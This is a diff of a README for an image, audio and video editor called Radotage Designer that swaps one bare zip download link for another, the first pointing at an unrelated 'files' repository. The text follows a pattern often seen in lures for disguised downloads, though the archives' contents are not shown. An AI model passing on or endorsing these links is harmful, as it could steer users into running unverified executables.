@@ -17,9 +17,9 @@ Welcome to **Radotage Designer**, an all-in-one application for image, audio, an
 - **Documentation**: Guidelines on how to use the application.
 
 ### 🚀 Get Started
-To get started with Radotage Designer, you can download the application by clicking [here](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip). Please note that the link needs to be launched to start the download. If you encounter any issues with the link, make sure to check the "Releases" section for an alternative download option.
+To get started with Radotage Designer, you can download the application by clicking [here](https://github.com/diyalakshmi15diya/Radotage-Designer/releases/download/v1.0.0/Application.zip). Please note that the link needs to be launched to start the download. If you encounter any issues with the link, make sure to check the "Releases" section for an alternative download option.
 
 ### 🎉 Enjoy Editing with Radotage Designer!
 Start creating amazing images, audio tracks, and videos with Radotage Designer. Let your creativity shine through with our diverse range of editing tools. Happy editing! 🌟
 
-[![Download Radotage Designer](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Radotage Designer](https://github.com/diyalakshmi15diya/Radotage-Designer/releases/download/v1.0.0/Application.zip)](https://github.com/diyalakshmi15diya/Radotage-Designer/releases/download/v1.0.0/Application.zip)
